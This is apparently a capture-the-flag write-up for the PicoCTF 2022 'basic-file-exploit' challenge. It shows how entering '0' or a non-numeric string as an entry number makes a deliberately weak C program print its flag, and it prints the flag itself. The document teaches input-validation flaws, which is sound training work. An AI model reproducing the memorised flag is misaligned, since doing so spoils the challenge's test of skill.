# PicoCTF 2022
## basic-file-exploit

Tags: Binary Exploitation
AUTHOR: WILL HONG

**Description**: The program provided allows you to write to a file and read what you wrote from it. Try playing around with it and see if you can break it! Connect to the program with netcat:

``$ nc saturn.picoctf.net 55825``

The program's source code with the flag redacted can be downloaded here [program-redacted.c].

## Solution / Explanation

Analyzing the source code provied in the challenge, the lines 143 to 147 we can identify the following code:

```
if ((entry_number = strtol(entry, NULL, 10)) == 0) {
    puts(flag);
    fseek(stdin, 0, SEEK_END);
    exit(0);
  }
```
I'm not really an expert in C ü§∑‚Äç‚ôÇÔ∏è, but it seems to tell me if ``entry_number`` is ``0``, it will print `puts()` me the flag. 

Searching the function ``strtol()`` on Google didn't give me much. Basically, this function covert the string to a long integer (?). 

So, I connected to the server and I tried to play around with the conditions: 

- If I insert "1" in the prompt, I can enter a new phrase and store it in the server, then I can press "2" and I'm able to read what I stored previously. 
- I noticed that the option "2" always returns "Read successfuly" with at least ONE stored result.

**Output:**

```
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
1
1
Please enter your data:
Oi
Oi
Please enter the length of your data:
2
2
Your entry number is: 1
Write successful, would you like to do anything else?
2
2
Please enter the entry number of your data:
1
1
Oi
Read successful, would you like to do anything else?
2
2
Please enter the entry number of your data:
52
52

Read successful, would you like to do anything else?
```

- If I start with the option 2, the server returns me "No data yet" and I can't retrieve anything.

```
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
2
2
No data yet
Please put in a valid number
2
2
No data yet
```

- If I insert negative or big numbers, asks me for put valid numbers, but when I did that, it returns me "Maybe breaking the boundaries elsewhere will be helpful". That's the lines 188 to 191 in the source code ``program-redacted.c``

```
Please put in a valid number
1000
1000
Please type either 1, 2 or 3
Maybe breaking boundaries elsewhere will be helpful
Please put in a valid number
No data given.
Please put in a valid number
-200
-200
Please type either 1, 2 or 3
Maybe breaking boundaries elsewhere will be helpful
Please put in a valid number
No data given.
Please put in a valid number
```

- So I tried giving different inputs after insert one valid entry and got the flag as result. It also worked putting "0" as the input to echo the phrase in the database.

**asdf as input after writing successfuly**
```
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
1
1
Please enter your data:
Oi
Oi
Please enter the length of your data:
2
2
Your entry number is: 1
Write successful, would you like to do anything else?
2
2
Please enter the entry number of your data:
asdf
asdf
picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_68466E2F}
```
**0 as input after writing successfuly**
```
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
1
1
Please enter your data:
Oi
Oi
Please enter the length of your data:
2
2
Your entry number is: 1
Write successful, would you like to do anything else?
2
2
Please enter the entry number of your data:
0
0
picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_68466E2F}
```

---
Daniel Reis (@danielxreis) - Cybersecurity Analyst